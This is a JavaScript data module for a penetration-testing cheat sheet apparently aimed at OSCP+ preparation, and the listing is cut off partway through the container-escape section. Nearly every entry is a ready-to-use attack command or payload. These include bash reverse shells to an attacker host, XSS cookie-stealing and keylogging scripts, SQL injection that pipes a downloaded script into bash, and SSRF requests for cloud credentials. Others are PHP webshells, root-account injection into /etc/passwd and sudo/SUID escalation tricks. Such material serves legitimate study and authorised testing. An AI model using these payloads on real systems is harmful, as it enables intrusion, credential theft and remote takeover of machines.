(function (root, factory) {
  var api = factory();
  if (typeof module === "object" && module.exports) {
    module.exports = api;
  }
  root.PentestCheatsheet = api;
})(typeof window !== "undefined" ? window : globalThis, function () {
  "use strict";

  var STORAGE_KEY = "security-buffor:pentest-cheatsheet";

  var variables = [
    "LHOST",
    "RHOST",
    "LPORT",
    "RPORT",
    "DOMAIN",
    "DC",
    "USER",
    "PASS",
    "HASH",
    "URL",
  ];

  var categories = [
    { id: "all", label: "All", group: "All" },
    { id: "recon", label: "Recon", group: "OSCP+ Core" },
    { id: "web", label: "Web Attacks", group: "OSCP+ Core" },
    { id: "api", label: "API Attacks", group: "OSCP+ Core" },
    { id: "lpe", label: "Linux PrivEsc", group: "OSCP+ Core" },
    { id: "wpe", label: "Windows PrivEsc", group: "OSCP+ Core" },
    { id: "tunnel", label: "Tunneling", group: "OSCP+ Core" },
    { id: "transfer", label: "File Transfer", group: "OSCP+ Core" },
    { id: "bof", label: "Buffer Overflow", group: "OSCP+ Core" },
    { id: "cloud", label: "Cloud Attacks", group: "OSCP+ Core" },
    { id: "pivot", label: "Pivoting / Tunnels", group: "OSCP+ Core" },
    { id: "osint", label: "OSINT / Ext Recon", group: "OSCP+ Core" },
    { id: "wifi", label: "Wireless Attacks", group: "OSCP+ Core" },
    { id: "adrecon", label: "AD Recon", group: "Active Directory" },
    { id: "adatk", label: "AD Attacks", group: "Active Directory" },
    { id: "adlat", label: "AD Lateral", group: "Active Directory" },
    { id: "adpst", label: "Persistence", group: "Active Directory" },
    { id: "adcerts", label: "AD Certs (ADCS)", group: "Active Directory" },
    { id: "adextra", label: "AD Extra Attacks", group: "Active Directory" },
    { id: "crack", label: "Hash Cracking", group: "Post-Exploitation" },
    { id: "misc", label: "Misc / Reference", group: "Post-Exploitation" },
    { id: "passatk", label: "Password Attacks", group: "Post-Exploitation" },
    { id: "postex", label: "Post-Exploit / Loot", group: "Post-Exploitation" },
  ];

  var commandSections =   [
      {
          "id": "recon",
          "label": "Recon",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "Host & Network Discovery",
                  "commands": [
                      {
                          "title": "Ping sweep",
                          "command": "nmap -sn {LHOST}/24 --min-rate 1000 -oG hosts.txt",
                          "tags": []
                      },
                      {
                          "title": "ARP scan (no ICMP)",
                          "command": "arp-scan -l",
                          "tags": []
                      },
                      {
                          "title": "Rustscan -> nmap pipe",
                          "command": "rustscan -a {RHOST} --ulimit 5000 -- -sV -sC",
                          "tags": []
                      },
                      {
                          "title": "Full TCP all ports (fast)",
                          "command": "nmap -sV -sC -p- --min-rate 5000 -oA full_{RHOST} {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "Quick top 1000",
                          "command": "nmap -sV -sC -oA quick_{RHOST} {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "UDP scan (top 20)",
                          "command": "nmap -sU --top-ports 20 {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "OS detection",
                          "command": "nmap -O --osscan-guess {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "Aggressive + all scripts",
                          "command": "nmap -A -T4 -oA aggro_{RHOST} {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "Vuln scripts",
                          "command": "nmap --script vuln -oA vuln_{RHOST} {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "SMB vuln + enum",
                          "command": "nmap --script smb-enum-shares,smb-enum-users,smb-vuln* -p 445 {RHOST}",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Service Enumeration",
                  "commands": [
                      {
                          "title": "FTP - anonymous login",
                          "command": "ftp {RHOST}\n# Username: anonymous  Password: (blank)",
                          "tags": []
                      },
                      {
                          "title": "FTP - nmap scripts",
                          "command": "nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "SMB - list shares",
                          "command": "smbclient -L //{RHOST} -N",
                          "tags": []
                      },
                      {
                          "title": "SMB - connect share",
                          "command": "smbclient //{RHOST}/Share -U {USER}%{PASS}",
                          "tags": []
                      },
                      {
                          "title": "SMB - full enum",
                          "command": "enum4linux -a {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "SMB - signing check",
                          "command": "crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt",
                          "tags": []
                      },
                      {
                          "title": "SNMP - walk",
                          "command": "snmpwalk -c public -v1 {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "SNMP - brute community",
                          "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "LDAP - anonymous",
                          "command": "ldapsearch -x -H ldap://{RHOST} -b 'dc=corp,dc=local'",
                          "tags": []
                      },
                      {
                          "title": "NFS - showmount",
                          "command": "showmount -e {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "DNS - zone transfer",
                          "command": "dig axfr @{RHOST} {DOMAIN}",
                          "tags": []
                      },
                      {
                          "title": "rpcclient - null session",
                          "command": "rpcclient -U '' -N {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "SMTP - user enum",
                          "command": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "MSSQL - enum",
                          "command": "nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 {RHOST}",
                          "tags": []
                      },
                      {
                          "title": "Redis - info",
                          "command": "redis-cli -h {RHOST} info",
                          "tags": []
                      },
                      {
                          "title": "MongoDB - dump",
                          "command": "mongodump --host {RHOST} --out /tmp/mongodump",
                          "tags": []
                      },
                      {
                          "title": "Elasticsearch",
                          "command": "curl -s http://{RHOST}:9200/_cat/indices",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Web Enumeration",
                  "commands": [
                      {
                          "title": "Gobuster dir",
                          "command": "gobuster dir -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,json -t 50",
                          "tags": []
                      },
                      {
                          "title": "Gobuster vhost",
                          "command": "gobuster vhost -u {URL} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
                          "tags": []
                      },
                      {
                          "title": "Feroxbuster recursive",
                          "command": "feroxbuster -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,js --depth 3",
                          "tags": []
                      },
                      {
                          "title": "ffuf dir",
                          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u {URL}/FUZZ -mc 200,301,302,403 -o ffuf_out.json",
                          "tags": []
                      },
                      {
                          "title": "ffuf vhost",
                          "command": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u {URL} -H 'Host: FUZZ.{DOMAIN}' -fc 302,404",
                          "tags": []
                      },
                      {
                          "title": "ffuf param",
                          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '{URL}/page.php?FUZZ=test' -mc 200,302",
                          "tags": []
                      },
                      {
                          "title": "Nikto",
                          "command": "nikto -h {URL}",
                          "tags": []
                      },
                      {
                          "title": "CeWL wordlist",
                          "command": "cewl {URL} -d 3 -m 6 -w cewl_words.txt",
                          "tags": []
                      },
                      {
                          "title": "WhatWeb fingerprint",
                          "command": "whatweb {URL} -v",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "web",
          "label": "Web Attacks",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "SQL Injection",
                  "commands": [
                      {
                          "title": "SQLmap GET",
                          "command": "sqlmap -u '{URL}/page.php?id=1' --dbs --batch",
                          "tags": []
                      },
                      {
                          "title": "SQLmap POST",
                          "command": "sqlmap -u '{URL}/login.php' --data='user=admin&pass=test' --dbs --batch",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "SQLmap dump table",
                          "command": "sqlmap -u '{URL}/page.php?id=1' -D dbname -T users --dump --batch",
                          "tags": []
                      },
                      {
                          "title": "SQLmap OS shell",
                          "command": "sqlmap -u '{URL}/page.php?id=1' --os-shell --batch",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "SQLmap from Burp request",
                          "command": "sqlmap -r request.txt --dbs --batch",
                          "tags": []
                      },
                      {
                          "title": "SQLmap cookie",
                          "command": "sqlmap -u '{URL}/' --cookie='session=abc123' --level 3 --risk 2 --dbs --batch",
                          "tags": []
                      },
                      {
                          "title": "UNION - detect columns",
                          "command": "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -",
                          "tags": []
                      },
                      {
                          "title": "UNION - MySQL version",
                          "command": "' UNION SELECT version(),NULL,NULL-- -",
                          "tags": []
                      },
                      {
                          "title": "Error-based MySQL",
                          "command": "' AND extractvalue(1,concat(0x7e,version()))-- -",
                          "tags": []
                      },
                      {
                          "title": "Time-based blind",
                          "command": "' AND SLEEP(5)-- -\n\" AND SLEEP(5)-- -",
                          "tags": []
                      },
                      {
                          "title": "Boolean blind",
                          "command": "' AND 1=1-- -   (true)\n' AND 1=2-- -   (false)",
                          "tags": []
                      },
                      {
                          "title": "MSSQL - xp_cmdshell",
                          "command": "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -\n'; EXEC xp_cmdshell('whoami');-- -",
                          "tags": []
                      },
                      {
                          "title": "MSSQL - stacked queries",
                          "command": "'; INSERT INTO users(name,pass) VALUES('hax','hax');-- -",
                          "tags": []
                      },
                      {
                          "title": "PostgreSQL - copy to/from",
                          "command": "'; COPY (SELECT '') TO PROGRAM 'curl http://{LHOST}/shell.sh|bash';-- -",
                          "tags": [
                              "crit"
                          ]
                      }
                  ]
              },
              {
                  "title": "LFI / Path Traversal",
                  "commands": [
                      {
                          "title": "Basic LFI",
                          "command": "{URL}/page.php?file=../../../../etc/passwd",
                          "tags": []
                      },
                      {
                          "title": "Null byte (PHP < 5.3)",
                          "command": "{URL}/page.php?file=../../../../etc/passwd%00",
                          "tags": []
                      },
                      {
                          "title": "PHP filter - read source",
                          "command": "{URL}/page.php?file=php://filter/convert.base64-encode/resource=index.php",
                          "tags": []
                      },
                      {
                          "title": "PHP expect - RCE",
                          "command": "{URL}/page.php?file=expect://id",
                          "tags": []
                      },
                      {
                          "title": "LFI - /proc/self/environ",
                          "command": "{URL}/page.php?file=/proc/self/environ&HTTP_USER_AGENT=<?php system($_GET['c']); ?>",
                          "tags": []
                      },
                      {
                          "title": "Apache log poison",
                          "command": "# Step 1: nc {RHOST} 80  then send: GET /<?php system($_GET['c']); ?> HTTP/1.1\n# Step 2: {URL}/page.php?file=/var/log/apache2/access.log&c=id",
                          "tags": []
                      },
                      {
                          "title": "SSH log poison",
                          "command": "ssh '<?php system($_GET[\"c\"]); ?>'@{RHOST}\n# Then: {URL}/page.php?file=/var/log/auth.log&c=whoami",
                          "tags": []
                      },
                      {
                          "title": "Windows path traversal",
                          "command": "{URL}/page.php?file=..\\..\\..\\windows\\win.ini\n{URL}/page.php?file=../../../../windows/system32/drivers/etc/hosts",
                          "tags": []
                      },
                      {
                          "title": "LFI2RCE via zip://",
                          "command": "{URL}/page.php?file=zip:///tmp/file.zip%23shell.php",
                          "tags": []
                      },
                      {
                          "title": "LFI2RCE via phar://",
                          "command": "# Create: echo '<?php system($_GET[\"c\"]); ?>' > shell.php; zip shell.zip shell.php; mv shell.zip shell.jpg\n# Access: {URL}/page.php?file=phar:///uploads/shell.jpg%2Fshell.php&c=id",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "File Upload Bypass",
                  "commands": [
                      {
                          "title": "PHP webshell",
                          "command": "<?php echo system($_GET['cmd']); ?>",
                          "tags": []
                      },
                      {
                          "title": "PHP short tag",
                          "command": "<?= system($_GET['c']); ?>",
                          "tags": []
                      },
                      {
                          "title": "PHP7 webshell",
                          "command": "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>",
                          "tags": []
                      },
                      {
                          "title": "PHP reverse shell upload",
                          "command": "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'); ?>",
                          "tags": []
                      },
                      {
                          "title": "Curl upload",
                          "command": "curl -F 'file=@shell.php' {URL}/upload.php",
                          "tags": []
                      },
                      {
                          "title": "Double extension",
                          "command": "shell.php.jpg  /  shell.php5  /  shell.phtml  /  shell.pHp",
                          "tags": []
                      },
                      {
                          "title": "Magic bytes bypass",
                          "command": "python3 -c \"open('shell.php.jpg','wb').write(b'\\xff\\xd8\\xff' + b'<?php system($_GET[chr(99)]); ?>')\"",
                          "tags": []
                      },
                      {
                          "title": "Null byte",
                          "command": "shell.php%00.jpg",
                          "tags": []
                      },
                      {
                          "title": "Exiftool metadata inject",
                          "command": "exiftool -Comment='<?php echo system($_GET[\"c\"]); ?>' image.jpg -o shell.php.jpg",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "XSS",
                  "commands": [
                      {
                          "title": "Basic XSS test",
                          "command": "<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>",
                          "tags": []
                      },
                      {
                          "title": "XSS cookie steal",
                          "command": "<script>fetch('http://{LHOST}/?c='+document.cookie)</script>",
                          "tags": []
                      },
                      {
                          "title": "XSS keylogger",
                          "command": "<script>document.onkeypress=function(e){fetch('http://{LHOST}/?k='+e.key)}</script>",
                          "tags": []
                      },
                      {
                          "title": "XSS filter bypass",
                          "command": "<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>",
                          "tags": []
                      },
                      {
                          "title": "Stored XSS payload",
                          "command": "<img src='x' onerror='var x=new XMLHttpRequest();x.open(\"GET\",\"http://{LHOST}/?c=\"+document.cookie);x.send()'>",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Command Injection",
                  "commands": [
                      {
                          "title": "Basic payloads",
                          "command": "; id\n| id\n`id`\n$(id)\n;id;",
                          "tags": []
                      },
                      {
                          "title": "Reverse shell",
                          "command": "; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
                          "tags": []
                      },
                      {
                          "title": "Blind - ping test",
                          "command": "; ping -c 3 {LHOST}",
                          "tags": []
                      },
                      {
                          "title": "URL encoded",
                          "command": "%3b+id  /  %7cid  /  %60id%60",
                          "tags": []
                      },
                      {
                          "title": "Bypass spaces",
                          "command": "${IFS}  /  {IFS}  /  $IFS\n;{cat,/etc/passwd}",
                          "tags": []
                      },
                      {
                          "title": "Bypass semicolons",
                          "command": "cat$IFS/etc/passwd\ncat</etc/passwd",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "SSRF",
                  "commands": [
                      {
                          "title": "Internal admin",
                          "command": "{URL}/api?url=http://127.0.0.1/admin",
                          "tags": []
                      },
                      {
                          "title": "AWS metadata",
                          "command": "{URL}/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                          "tags": []
                      },
                      {
                          "title": "Azure metadata",
                          "command": "{URL}/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                          "tags": []
                      },
                      {
                          "title": "GCP metadata",
                          "command": "{URL}/api?url=http://metadata.google.internal/computeMetadata/v1/",
                          "tags": []
                      },
                      {
                          "title": "Internal port scan",
                          "command": "{URL}/api?url=http://127.0.0.1:22\n{URL}/api?url=http://127.0.0.1:3306",
                          "tags": []
                      },
                      {
                          "title": "SSRF to Redis RCE",
                          "command": "{URL}/api?url=dict://127.0.0.1:6379/set:crontab:*/1 * * * * bash -i>&/dev/tcp/{LHOST}/{LPORT} 0>&1",
                          "tags": []
                      },
                      {
                          "title": "Localhost bypasses",
                          "command": "http://0.0.0.0/  /  http://[::1]/  /  http://127.1/  /  http://0177.0.0.1/\nhttp://2130706433/  (127.0.0.1 decimal)",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "XXE (XML External Entity)",
                  "commands": [
                      {
                          "title": "Basic XXE",
                          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                          "tags": []
                      },
                      {
                          "title": "XXE SSRF",
                          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{LHOST}/test\">]><root>&xxe;</root>",
                          "tags": []
                      },
                      {
                          "title": "Blind XXE OOB",
                          "command": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{LHOST}/evil.dtd\"> %xxe;]><root/>",
                          "tags": []
                      },
                      {
                          "title": "XXE via SVG upload",
                          "command": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n  <!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n  <text>&xxe;</text>\n</svg>",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "api",
          "label": "API Attacks",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "REST API Recon",
                  "commands": [
                      {
                          "title": "Swagger / OpenAPI docs",
                          "command": "curl -s {URL}/swagger.json | python3 -m json.tool\ncurl -s {URL}/openapi.json\ncurl -s {URL}/api/docs\ncurl -s {URL}/v1/api-docs",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "API endpoint bruteforce",
                          "command": "gobuster dir -u {URL}/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -x json -t 40",
                          "tags": []
                      },
                      {
                          "title": "API version enum",
                          "command": "curl -s {URL}/v1/users\ncurl -s {URL}/v2/users\ncurl -s {URL}/api/v1/users",
                          "tags": []
                      },
                      {
                          "title": "HTTP method test",
                          "command": "curl -s -X GET {URL}/api/users\ncurl -s -X POST {URL}/api/users\ncurl -s -X PUT {URL}/api/users/1\ncurl -s -X DELETE {URL}/api/users/1\ncurl -s -X PATCH {URL}/api/users/1",
                          "tags": []
                      },
                      {
                          "title": "Headers enum",
                          "command": "curl -v {URL}/api/users 2>&1 | grep -E 'Server:|X-Powered|Content-Type|Access-Control'",
                          "tags": []
                      },
                      {
                          "title": "ffuf API params",
                          "command": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '{URL}/api/user?FUZZ=1' -mc 200,302,400,403,500",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "JWT Attacks",
                  "commands": [
                      {
                          "title": "Decode JWT (no verify)",
                          "command": "echo 'JWT_TOKEN' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "JWT alg=none attack",
                          "command": "# Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}\n# Remove signature (keep trailing dot)\n# python3:\nimport base64, json\nheader = base64.b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).decode().rstrip('=')\npayload = base64.b64encode(json.dumps({\"user\":\"admin\",\"role\":\"admin\"}).encode()).decode().rstrip('=')\nprint(f\"{header}.{payload}.\")",
                          "tags": []
                      },
                      {
                          "title": "JWT - weak secret brute",
                          "command": "hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt",
                          "tags": []
                      },
                      {
                          "title": "JWT - HS256 resign with found secret",
                          "command": "python3 -c \"\nimport hmac, hashlib, base64, json\nheader = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).decode().rstrip('=')\npayload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')\nsig_input = f'{header}.{payload}'.encode()\nsig = base64.urlsafe_b64encode(hmac.new(b'SECRET', sig_input, hashlib.sha256).digest()).decode().rstrip('=')\nprint(f'{header}.{payload}.{sig}')\"",
                          "tags": []
                      },
                      {
                          "title": "jwt_tool full test",
                          "command": "jwt_tool JWT_TOKEN -t {URL}/api/profile -rh 'Authorization: Bearer JWT_TOKEN' -M at",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "JWT - RS256 to HS256 (pubkey confuse)",
                          "command": "# Use jwt_tool:\njwt_tool JWT_TOKEN -X k -pk public_key.pem",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "GraphQL Attacks",
                  "commands": [
                      {
                          "title": "GraphQL introspection",
                          "command": "curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' | python3 -m json.tool",
                          "tags": [
                              "new"
                          ]
                      },
                      {
                          "title": "Full schema dump",
                          "command": "curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { queryType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }\"}'",
                          "tags": []
                      },
                      {
                          "title": "GraphQL IDOR test",
                          "command": "curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ user(id: 1) { id email password } }\"}'",
                          "tags": []
                      },
                      {
                          "title": "GraphQL mutation (modify data)",
                          "command": "curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"mutation { updateUser(id:1, role:\\\"admin\\\") { id role } }\"}'",
                          "tags": []
                      },
                      {
                          "title": "GraphQL SQLi",
                          "command": "curl -s -X POST {URL}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{ user(id: \\\"1 OR 1=1\\\") { email } }\"}'",
                          "tags": []
                      },
                      {
                          "title": "GraphQL batch DoS",
                          "command": "# Send 1000 introspection queries in one batch request",
                          "tags": []
                      },
                      {
                          "title": "Graphw00f (GraphQL fingerprint)",
                          "command": "python3 graphw00f.py -d -f -t {URL}/graphql",
                          "tags": [
                              "new"
                          ]
                      }
                  ]
              },
              {
                  "title": "OAuth / SSO Attacks",
                  "commands": [
                      {
                          "title": "OAuth implicit flow intercept",
                          "command": "# Intercept redirect_uri, change to attacker URL\n# Steal access_token from URL fragment",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "OAuth state CSRF",
                          "command": "# Remove state parameter from auth request\n# Craft CSRF attack linking victim account",
                          "tags": []
                      },
                      {
                          "title": "Open redirect in redirect_uri",
                          "command": "{URL}/oauth/auth?response_type=token&client_id=app&redirect_uri=https://{LHOST}",
                          "tags": []
                      },
                      {
                          "title": "JWT in OAuth - check expiry",
                          "command": "# Decode token, check exp claim\n# Try reuse of old/expired tokens",
                          "tags": []
                      },
                      {
                          "title": "SAML - signature wrapping",
                          "command": "# Duplicate Assertion, modify first, keep signature on second",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "IDOR & Broken Access",
                  "commands": [
                      {
                          "title": "IDOR - ID manipulation",
                          "command": "curl -s {URL}/api/user/1 -H 'Authorization: Bearer YOUR_TOKEN'\ncurl -s {URL}/api/user/2 -H 'Authorization: Bearer YOUR_TOKEN'",
                          "tags": [
                              "high"
                          ]
                      },
                      {
                          "title": "IDOR - UUID predict",
                          "command": "curl -s {URL}/api/orders/UUID_HERE -H 'Authorization: Bearer YOUR_TOKEN'",
                          "tags": []
                      },
                      {
                          "title": "Mass assignment",
                          "command": "curl -s -X PUT {URL}/api/user/1 -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"john\",\"role\":\"admin\",\"balance\":99999}'",
                          "tags": [
                              "crit"
                          ]
                      },
                      {
                          "title": "HTTP verb tampering",
                          "command": "# If PUT/DELETE blocked, try:\ncurl -X PATCH {URL}/api/admin/users/1 -H 'Authorization: Bearer TOKEN' -d '{\"active\":false}'",
                          "tags": []
                      },
                      {
                          "title": "API rate limiting bypass",
                          "command": "# Add headers: X-Forwarded-For: 1.2.3.4\n# Or: X-Real-IP: 1.2.3.4\ncurl -H 'X-Forwarded-For: 192.168.{LPORT}.1' {URL}/api/login",
                          "tags": []
                      }
                  ]
              }
          ]
      },
      {
          "id": "lpe",
          "label": "Linux PrivEsc",
          "group": "OSCP+ Core",
          "groups": [
              {
                  "title": "Automated Enum",
                  "commands": [
                      {
                          "title": "LinPEAS",
                          "command": "curl -s http://{LHOST}/linpeas.sh | bash",
                          "tags": []
                      },
                      {
                          "title": "pspy (process/cron watch)",
                          "command": "./pspy64 -pf -i 1000",
                          "tags": []
                      },
                      {
                          "title": "Linux Exploit Suggester",
                          "command": "./linux-exploit-suggester.sh",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Manual Checks",
                  "commands": [
                      {
                          "title": "sudo -l <- FIRST THING",
                          "command": "sudo -l",
                          "tags": []
                      },
                      {
                          "title": "SUID binaries",
                          "command": "find / -perm -u=s -type f 2>/dev/null",
                          "tags": []
                      },
                      {
                          "title": "Capabilities",
                          "command": "getcap -r / 2>/dev/null",
                          "tags": []
                      },
                      {
                          "title": "Writable files",
                          "command": "find / -writable -type f 2>/dev/null | grep -v proc",
                          "tags": []
                      },
                      {
                          "title": "Cron jobs",
                          "command": "cat /etc/crontab && ls -la /etc/cron*",
                          "tags": []
                      },
                      {
                          "title": "Bash history",
                          "command": "cat ~/.bash_history ~/.zsh_history 2>/dev/null",
                          "tags": []
                      },
                      {
                          "title": "Password grep",
                          "command": "grep -r 'password\\|passwd\\|secret\\|token' /etc /home /var/www 2>/dev/null | grep -v Binary",
                          "tags": []
                      },
                      {
                          "title": "SSH keys",
                          "command": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "SUDO Exploits (GTFOBins)",
                  "commands": [
                      {
                          "title": "sudo bash",
                          "command": "sudo bash  OR  sudo su",
                          "tags": []
                      },
                      {
                          "title": "sudo vi",
                          "command": "sudo vi\n:!bash",
                          "tags": []
                      },
                      {
                          "title": "sudo awk",
                          "command": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
                          "tags": []
                      },
                      {
                          "title": "sudo find",
                          "command": "sudo find . -exec /bin/bash \\; -quit",
                          "tags": []
                      },
                      {
                          "title": "sudo python3",
                          "command": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
                          "tags": []
                      },
                      {
                          "title": "sudo env",
                          "command": "sudo env /bin/bash",
                          "tags": []
                      },
                      {
                          "title": "sudo tee (write as root)",
                          "command": "echo 'hax::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd && su hax",
                          "tags": []
                      },
                      {
                          "title": "sudo tar",
                          "command": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
                          "tags": []
                      },
                      {
                          "title": "sudo zip",
                          "command": "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/bash'",
                          "tags": []
                      },
                      {
                          "title": "sudo rsync",
                          "command": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                          "tags": []
                      },
                      {
                          "title": "sudo mysql",
                          "command": "sudo mysql -e '\\! /bin/bash'",
                          "tags": []
                      },
                      {
                          "title": "sudo git",
                          "command": "sudo git -p help\n# Then: !/bin/bash",
                          "tags": []
                      },
                      {
                          "title": "sudo strace",
                          "command": "sudo strace -o /dev/null /bin/sh",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "SUID Exploits",
                  "commands": [
                      {
                          "title": "SUID bash",
                          "command": "/bin/bash -p",
                          "tags": []
                      },
                      {
                          "title": "SUID find",
                          "command": "find . -exec /bin/bash -p \\; -quit",
                          "tags": []
                      },
                      {
                          "title": "SUID python",
                          "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                          "tags": []
                      },
                      {
                          "title": "SUID vim",
                          "command": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/bash\",\"bash\",\"-c\",\"reset; exec bash\")'",
                          "tags": []
                      },
                      {
                          "title": "SUID nano (edit /etc/shadow)",
                          "command": "nano /etc/shadow\n# Add root password hash",
                          "tags": []
                      },
                      {
                          "title": "SUID cp (overwrite /etc/passwd)",
                          "command": "cp /etc/passwd /tmp/bak\necho 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd\nsu root2",
                          "tags": []
                      },
                      {
                          "title": "SUID env",
                          "command": "env /bin/bash -p",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Capabilities",
                  "commands": [
                      {
                          "title": "python3 cap_setuid",
                          "command": "python3 -c 'import ctypes; ctypes.CDLL(None).setuid(0); import os; os.system(\"/bin/bash\")'",
                          "tags": []
                      },
                      {
                          "title": "perl cap_setuid",
                          "command": "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\"'",
                          "tags": []
                      },
                      {
                          "title": "openssl cap read",
                          "command": "openssl enc -in /etc/shadow",
                          "tags": []
                      },
                      {
                          "title": "node cap_setuid",
                          "command": "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Cron & PATH Hijack",
                  "commands": [
                      {
                          "title": "Inject into writable cron script",
                          "command": "echo 'bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1' >> /path/to/cron.sh",
                          "tags": []
                      },
                      {
                          "title": "PATH hijack via cron",
                          "command": "echo '#!/bin/bash\nbash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1' > /tmp/faketool\nchmod +x /tmp/faketool\nexport PATH=/tmp:$PATH",
                          "tags": []
                      },
                      {
                          "title": "Wildcard injection - tar",
                          "command": "cd /vuln/dir\necho '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=bash shell.sh'\necho 'bash -i >& /dev/tcp/{LHOST}/{RPORT} 0>&1' > shell.sh",
                          "tags": []
                      }
                  ]
              },
              {
                  "title": "Container Escapes",
                  "commands": [
                      {
                          "title": "Docker - check if in container",
                          "command": "ls /.dockerenv && cat /proc/1/cgroup | grep docker",
                          "tags": [
                              "containers"
                          ]
                      },
                      {
